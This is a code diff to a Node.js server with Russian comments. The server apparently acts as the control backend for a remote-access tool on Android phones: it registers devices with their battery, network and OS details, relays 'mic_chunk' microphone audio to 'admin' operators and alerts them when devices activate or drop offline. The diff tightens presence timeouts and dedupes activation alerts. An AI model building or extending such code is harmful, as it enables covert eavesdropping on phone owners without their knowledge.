@@ -44,19 +44,37 @@ const server = http.createServer(async (req, res) => {
         const id = body.deviceId || 'unknown';
 
         if (role === 'admin') {
+            const wasOnline = admins.has(id);
             admins.set(id, { lastSeen: Date.now(), queue: [] });
-            console.log('[+] admin online: ' + id);
+            if (!wasOnline) console.log('[+] admin online: ' + id);
+
+            // При подключении админа — удаляем всех «мёртвых» клиентов
+            const now = Date.now();
+            const toRemove = [];
+            for (const [cid, c] of clients) {
+                if (now - c.lastSeen > 4000) toRemove.push(cid);
+            }
+            for (const cid of toRemove) {
+                clients.delete(cid);
+                console.log('[-] stale client removed on admin register: ' + cid);
+            }
         } else {
-            const existing = clients.get(id) || {};
+            const existing = clients.get(id);
+            const wasOffline = !existing;
+
+            // lastSeen НЕ обновляем при регистрации — только через /event
             clients.set(id, {
-                name: body.name || existing.name || '',
-                network: body.network || existing.network || '',
-                battery: body.battery || existing.battery || 0,
-                android: body.android || existing.android || '',
-                lastSeen: Date.now(),
-                queue: existing.queue || []
+                name: body.name || (existing && existing.name) || '',
+                network: body.network || (existing && existing.network) || '',
+                battery: body.battery || (existing && existing.battery) || 0,
+                android: body.android || (existing && existing.android) || '',
+                lastSeen: (existing && existing.lastSeen) || Date.now(),
+                queue: (existing && existing.queue) || []
             });
-            console.log('[+] client online: ' + id + ' name=' + (body.name || '-') + ' bat=' + (body.battery || '-'));
+
+            if (wasOffline) {
+                console.log('[+] client online: ' + id + ' name=' + (body.name || '-'));
+            }
         }
         return send(res, 200, { ok: true });
     }
@@ -90,7 +108,7 @@ const server = http.createServer(async (req, res) => {
                     network: c.network,
                     battery: c.battery,
                     android: c.android,
-                    online: now - c.lastSeen < 8000,
+                    online: now - c.lastSeen < 4000,
                     lastSeen: c.lastSeen
                 });
             }
@@ -151,14 +169,22 @@ const server = http.createServer(async (req, res) => {
                 a.queue.push({ type: 'mic_chunk', deviceId: id, data: body.data || '', ts: Date.now() });
             }
         } else if (t === 'client_activated') {
-            console.log('[!] client activated: ' + id + ' name=' + (body.name || '-'));
-            for (const [, a] of admins) {
-                a.queue.push({
-                    type: 'client_activated',
-                    deviceId: id,
-                    name: body.name || 'Unknown',
-                    ts: Date.now()
-                });
+            // Дедупликация — не чаще 1 раза в 5 секунд на устройство
+            const lastKey = id + '_last_activated';
+            const now = Date.now();
+            if (!global[lastKey] || now - global[lastKey] > 5000) {
+                global[lastKey] = now;
+                console.log('[!] client activated: ' + id + ' name=' + (body.name || '-'));
+                for (const [, a] of admins) {
+                    a.queue.push({
+                        type: 'client_activated',
+                        deviceId: id,
+                        name: body.name || 'Unknown',
+                        ts: now
+                    });
+                }
+            } else {
+                console.log('[~] client_activated ignored (duplicate): ' + id);
             }
         }
 
@@ -169,17 +195,21 @@ const server = http.createServer(async (req, res) => {
     send(res, 404, { ok: false });
 });
 
+// Таймаут 4 секунды, проверка каждую 1 секунду
 setInterval(() => {
     const now = Date.now();
     for (const [id, c] of clients) {
-        if (now - c.lastSeen > 60000) {
+        if (now - c.lastSeen > 4000) {
             clients.delete(id);
             console.log('[-] client removed (timeout): ' + id);
+            for (const [, a] of admins) {
+                a.queue.push({ type: 'client_offline', deviceId: id, ts: Date.now() });
+            }
         }
     }
     for (const [id, a] of admins) {
         if (now - a.lastSeen > 120000) admins.delete(id);
     }
-}, 5000);
+}, 1000);
 
 server.listen(PORT, () => console.log('Server on port ' + PORT));
